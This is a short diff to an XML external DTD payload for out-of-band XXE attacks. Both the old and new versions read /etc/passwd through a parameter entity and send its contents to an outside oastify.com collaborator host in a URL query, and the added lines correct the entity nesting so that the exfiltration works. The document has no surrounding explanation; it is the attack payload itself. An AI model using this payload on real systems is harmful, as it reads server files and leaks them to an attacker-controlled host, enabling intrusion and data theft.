@@ -1,3 +1,4 @@
-<!ENTITY % data SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://kma6ziomnoo9ahmjcnvx54h10s6ju9iy.oastify.com/?data=%data;'>">
-%exfil
+<!ENTITY % a SYSTEM "file:///etc/passwd">
+<!ENTITY % b "<!ENTITY % c SYSTEM 'http://kma6ziomnoo9ahmjcnvx54h10s6ju9iy.oastify.com/?data=%a;'>">
+%b;
+%c;
